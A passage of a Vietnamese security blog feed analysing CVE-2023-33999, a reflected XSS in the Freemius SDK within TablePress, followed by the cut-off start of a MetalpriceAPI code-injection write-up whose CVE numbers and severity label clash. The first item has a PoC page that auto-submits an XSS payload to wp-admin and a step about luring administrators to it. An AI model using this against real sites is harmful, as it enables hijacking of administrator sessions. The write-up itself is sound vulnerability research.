src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#39; alt=&#34;Call&#34; height=&#34;165&#34; width=&#34;702&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;127 references&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;n√™n qu√° tr√¨nh &lt;code&gt;trace&lt;/code&gt; h∆°i t·ªëi th·ªùi gian&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#34; title=&#34;V·ªã tr√≠ g·ªçi fs_request_get&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;V·ªã tr√≠ g·ªçi fs_request_get&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#39; alt=&#34;Search&#34; height=&#34;663&#34; width=&#34;1616&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;V·ªã tr√≠ g·ªçi fs_request_get&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;dynamic_init()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;fs_request_get()&lt;/code&gt; ƒë·ªÉ l·∫•y gi√° tr·ªã c·ªßa c√°c key nh∆∞ &lt;code&gt;purchased_plan&lt;/code&gt; v√† &lt;code&gt;purchase_email&lt;/code&gt; t·ª´ request, sau ƒë√≥ s·ª≠ d·ª•ng c√°c gi√° tr·ªã n√†y ƒë·ªÉ hi·ªÉn th·ªã n·ªôi dung th√¥ng b√°o x√°c nh·∫≠n mua license trong trang qu·∫£n tr·ªã. C√°c gi√° tr·ªã n√†y kh√¥ng ƒë∆∞·ª£c l√†m s·∫°ch tr∆∞·ªõc khi ƒë∆∞·ª£c ƒë∆∞a v√†o n·ªôi dung hi·ªÉn th·ªã, d·∫´n ƒë·∫øn nguy c∆° d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t c√≥ th·ªÉ ch√®n m√£ ƒë·ªôc v√† g√¢y ra l·ªó h·ªïng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ th√¥ng b√°o n√†y x·∫£y ra, c·∫ßn ph·∫£i ƒë√°p ·ª©ng 3 ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Request ph·∫£i ƒë∆∞·ª£c g·ªçi t·ª´ Admin Dashboard&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_user_in_admin()&#xA;/**&#xA; * Check if a real user is visiting the admin dashboard.&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.1.7&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_user_in_admin() {&#xA;    return (&#xA;        is_admin() &amp;amp;&amp;amp;&#xA;        ! self::is_ajax() &amp;amp;&amp;amp;&#xA;        ! self::is_cron() &amp;amp;&amp;amp;&#xA;        ! self::is_admin_post()&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra ng∆∞·ªùi d√πng ƒë√£ t·ª´ng k·∫øt n·ªëi (opt-in) v·ªõi Freemius hay ch∆∞a.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;is_registered()&#xA;/**&#xA; * Check if user has connected his account (opted-in).&#xA; *&#xA; * Note:&#xA; *      If the user opted-in and opted-out on a later stage,&#xA; *      this will still return true. If you want to check if the&#xA; *      user is currently opted-in, use:&#xA; *          `$fs-&amp;gt;is_registered() &amp;amp;&amp;amp; $fs-&amp;gt;is_tracking_allowed()`&#xA; *&#xA; * @author Vova Feldman (@svovaf)&#xA; * @since  1.0.1&#xA; *&#xA; * @param bool $ignore_anonymous_state Since 2.5.1&#xA; *&#xA; * @return bool&#xA; */&#xA;function is_registered( $ignore_anonymous_state = false ) {&#xA;    return (&#xA;        is_object( value: $this-&amp;gt;_user ) &amp;amp;&amp;amp;&#xA;        (&#xA;            $this-&amp;gt;is_premium() ||&#xA;            $ignore_anonymous_state ||&#xA;            ! $this-&amp;gt;is_anonymous()&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi thi·∫øt l·∫≠p plugin th√†nh c√¥ng, h·ªá th·ªëng s·∫Ω g·ª≠i m·ªôt email x√°c nh·∫≠n ƒë·ªÉ ho√†n t·∫•t qu√° tr√¨nh k·∫øt n·ªëi (opt-in) n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; title=&#34;K·∫øt n·ªëi v·ªõi Freemius&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/opt_in.png&#34; data-sub-html=&#34;&lt;h2&gt;Opt In&lt;/h2&gt;&lt;p&gt;K·∫øt n·ªëi v·ªõi Freemius&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/opt_in.png&#39; alt=&#34;Opt In&#34; height=&#34;238&#34; width=&#34;1380&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt n·ªëi v·ªõi Freemius&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Request ph·∫£i ch·ª©a param &lt;code&gt;purchase_completed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;fs_request_has( &amp;#39;purchase_completed&amp;#39; )&#xA;function fs_request_has( $key ) {&#xA;    return isset( $_REQUEST[ $key ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;dynamic_init()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;fs_dynamic_init()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function fs_dynamic_init( $module ) {&#xA;    $fs = Freemius::instance( $module[&amp;#39;id&amp;#39;], $module[&amp;#39;slug&amp;#39;], true );&#xA;    $fs-&amp;gt;dynamic_init( $module );&#xA;&#xA;    return $fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y t·∫°o m·ªôt instance c·ªßa &lt;code&gt;Freemius&lt;/code&gt; v√† g·ªçi &lt;code&gt;dynamic_init()&lt;/code&gt; ƒë·ªÉ kh·ªüi t·∫°o SDK v·ªõi c·∫•u h√¨nh t·ª´ &lt;code&gt;$module&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;fs_dynamic_init()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong file &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; (&lt;code&gt;h√†m tb_tp_fs()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tb_tp_fs() {&#xA;    global $tb_tp_fs;&#xA;&#xA;    if ( ! isset( $tb_tp_fs ) ) {&#xA;        // Include Freemius SDK.&#xA;        require_once __DIR__ . &amp;#39;/libraries/freemius/start.php&amp;#39;;&#xA;&#xA;        $tb_tp_fs = fs_dynamic_init( array(&#xA;            &amp;#39;id&amp;#39;                =&amp;gt; &amp;#39;10340&amp;#39;,&#xA;            &amp;#39;slug&amp;#39;              =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;            &amp;#39;type&amp;#39;              =&amp;gt; &amp;#39;plugin&amp;#39;,&#xA;            &amp;#39;public_key&amp;#39;        =&amp;gt; &amp;#39;pk_b215ca1bb4041cf43ed137ae7665b&amp;#39;,&#xA;            &amp;#39;is_premium&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_addons&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;has_paid_plans&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;menu&amp;#39;              =&amp;gt; array(&#xA;                &amp;#39;slug&amp;#39;    =&amp;gt; &amp;#39;tablepress&amp;#39;,&#xA;                &amp;#39;contact&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;support&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;account&amp;#39; =&amp;gt; false,&#xA;                &amp;#39;pricing&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;opt_in_moderation&amp;#39; =&amp;gt; array(&#xA;                &amp;#39;new&amp;#39;       =&amp;gt; true,&#xA;                &amp;#39;updates&amp;#39;   =&amp;gt; false,&#xA;                &amp;#39;localhost&amp;#39; =&amp;gt; false,&#xA;            ),&#xA;            &amp;#39;is_live&amp;#39;           =&amp;gt; true,&#xA;        ) );&#xA;    }&#xA;&#xA;    return $tb_tp_fs;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫°p Freemius SDK&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;fs_dynamic_init()&lt;/code&gt; v·ªõi c·∫•u h√¨nh d√†nh ri√™ng cho TablePress&lt;/li&gt;&#xA;&lt;li&gt;L∆∞u instance v√†o bi·∫øn global &lt;code&gt;$tb_tp_fs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;tb_tp_fs()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ngay trong &lt;code&gt;tablepress/tablepress.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Init Freemius.&#xA;tb_tp_fs();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V√¨ &lt;code&gt;tablepress.php&lt;/code&gt; l√† file ƒë∆∞·ª£c WordPress load ƒë·∫ßu ti√™n khi plugin ch·∫°y, n√™n Freemius SDK c≈©ng ƒë∆∞·ª£c kh·ªüi t·∫°o ngay t·ª´ ƒë√¢y.&lt;/p&gt;&#xA;&lt;p&gt;Do ƒë√≥, lu·ªìng &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; ‚Üí &lt;code&gt;tb_tp_fs()&lt;/code&gt; ‚Üí &lt;code&gt;fs_dynamic_init()&lt;/code&gt; ‚Üí &lt;code&gt;dynamic_init()&lt;/code&gt; lu√¥n ƒë∆∞·ª£c th·ª±c thi m·ªói khi WordPress x·ª≠ l√Ω m·ªôt request v√† plugin TablePress ƒë∆∞·ª£c load. ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi vi·ªác c√°c logic n·∫±m trong &lt;code&gt;dynamic_init()&lt;/code&gt;, bao g·ªìm vi·ªác ƒë·ªçc d·ªØ li·ªáu t·ª´ request (nh∆∞ &lt;code&gt;purchased_plan&lt;/code&gt;, &lt;code&gt;purchase_email‚Ä¶&lt;/code&gt;), s·∫Ω lu√¥n c√≥ c∆° h·ªôi ƒë∆∞·ª£c k√≠ch ho·∫°t khi ng∆∞·ªùi d√πng truy c·∫≠p v√†o c√°c endpoint li√™n quan ƒë·∫øn khu v·ª±c qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#34; title=&#34;K√≠ch ho·∫°t l·ªó h·ªïng&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/trigger.png&#34; data-sub-html=&#34;&lt;h2&gt;Trigger&lt;/h2&gt;&lt;p&gt;K√≠ch ho·∫°t l·ªó h·ªïng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#39; alt=&#34;Trigger&#34; height=&#34;1056&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K√≠ch ho·∫°t l·ªó h·ªïng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, ƒë·ªÉ l·ªó h·ªïng c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng v·ªõi ƒë·∫∑c quy·ªÅn Unauthenticated, k·∫ª t·∫•n c√¥ng kh√¥ng th·ªÉ t·ª± t√°c ƒë·ªông tr·ª±c ti·∫øp m√† ph·∫£i x√¢y d·ª±ng m·ªôt k·ªãch b·∫£n gi√°n ti·∫øp, ch·∫≥ng h·∫°n b·∫±ng c√°ch d·ª• qu·∫£n tr·ªã vi√™n truy c·∫≠p v√†o m·ªôt website ƒë·ªôc h·∫°i (malicious website). Khi ƒë√≥, tr√¨nh duy·ªát c·ªßa admin c√≥ th·ªÉ v√¥ t√¨nh g·ª≠i request t·ªõi trang qu·∫£n tr·ªã WordPress ƒëang ƒëƒÉng nh·∫≠p, mang theo c√°c tham s·ªë do k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t, t·ª´ ƒë√≥ k√≠ch ho·∫°t h√†nh vi kh√¥ng mong mu·ªën trong qu√° tr√¨nh x·ª≠ l√Ω c·ªßa plugin.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;PoC&lt;/span&gt;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o m·ªôt website ƒë·ªôc h·∫°i c√≥ nhi·ªám v·ª• t·ª± ƒë·ªông g·ª≠i request t·ªõi trang qu·∫£n tr·ªã WordPress:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&#xA;  &amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/index.php&amp;#34;&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;purchase&amp;amp;#95;email&amp;#34; value=&amp;#34;&amp;amp;lt;svg&amp;amp;#47;onload&amp;amp;#61;alert&amp;amp;#40;&amp;amp;#41;&amp;amp;gt;&amp;#34; /&amp;gt;&#xA;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit request&amp;#34; /&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;      history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;);&#xA;      document.forms[0].submit();&#xA;    &amp;lt;/script&amp;gt;&#xA;  &amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i ƒë∆∞·ªùng link c·ªßa website n√†y cho ng∆∞·ªùi d√πng c√≥ quy·ªÅn qu·∫£n tr·ªã v√† d·ª• h·ªç truy c·∫≠p, t·ª´ ƒë√≥ k√≠ch ho·∫°t request ƒë∆∞·ª£c g·ª≠i ƒëi khi trang ƒë·ªôc h·∫°i ƒë∆∞·ª£c t·∫£i.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2023-33999 xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;kh√¥ng l√†m s·∫°ch d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt; trong &lt;code&gt;fs_request_get()&lt;/code&gt; c·ªßa Freemius SDK, cho ph√©p d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o n·ªôi dung hi·ªÉn th·ªã trong trang qu·∫£n tr·ªã. V√¨ Freemius ƒë∆∞·ª£c nh√∫ng r·ªông r√£i trong r·∫•t nhi·ªÅu plugin v√† theme, ph·∫°m vi ·∫£nh h∆∞·ªüng c·ªßa l·ªó h·ªïng n√†y l·ªõn h∆°n r·∫•t nhi·ªÅu so v·ªõi m·ªôt plugin ƒë∆°n l·∫ª. B·∫£n v√° 2.5.10 ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ b·∫±ng c√°ch &lt;strong&gt;t√°ch ri√™ng b∆∞·ªõc l·∫•y d·ªØ li·ªáu v√† b∆∞·ªõc l√†m s·∫°ch&lt;/strong&gt;, ƒë·∫£m b·∫£o m·ªçi d·ªØ li·ªáu t·ª´ request ƒë·ªÅu ƒë∆∞·ª£c sanitize tr∆∞·ªõc khi s·ª≠ d·ª•ng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu t·ª´ &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_REQUEST&lt;/code&gt; ‚Äì lu√¥n &lt;strong&gt;sanitize v√† escape&lt;/strong&gt; tr∆∞·ªõc khi s·ª≠ d·ª•ng ho·∫∑c hi·ªÉn th·ªã.&lt;/li&gt;&#xA;&lt;li&gt;M·ªôt SDK d√πng chung (nh∆∞ Freemius) khi c√≥ l·ªó h·ªïng s·∫Ω t·∫°o &lt;strong&gt;t√°c ƒë·ªông d√¢y chuy·ªÅn&lt;/strong&gt; l√™n h√†ng ngh√¨n s·∫£n ph·∫©m.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n ki·ªÉm tra c√°c th∆∞ vi·ªán b√™n th·ª© ba v√† &lt;strong&gt;c·∫≠p nh·∫≠t phi√™n b·∫£n v√° l·ªói k·ªãp th·ªùi&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác kh·ªüi t·∫°o SDK s·ªõm (early init) khi·∫øn l·ªó h·ªïng c√≥ th·ªÉ b·ªã k√≠ch ho·∫°t tr√™n nhi·ªÅu request h∆°n d·ª± ki·∫øn.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS c√≥ th·ªÉ ƒë∆∞·ª£c khai th√°c gi√°n ti·∫øp th√¥ng qua &lt;strong&gt;social engineering&lt;/strong&gt; v√† c√°c website ƒë·ªôc h·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross Site Scripting&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-05-cve-2025-48140/</link>
      <pubDate>Fri, 05 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-05-cve-2025-48140/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng Improper Control of Generation of Code (&amp;ldquo;Code Injection&amp;rdquo;) trong MetalpriceAPI cho ph√©p th·ª±c hi·ªán Code Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn MetalpriceAPI: t·ª´ n/a ƒë·∫øn phi√™n b·∫£n &lt;strong&gt;1.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/metalpriceapi/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 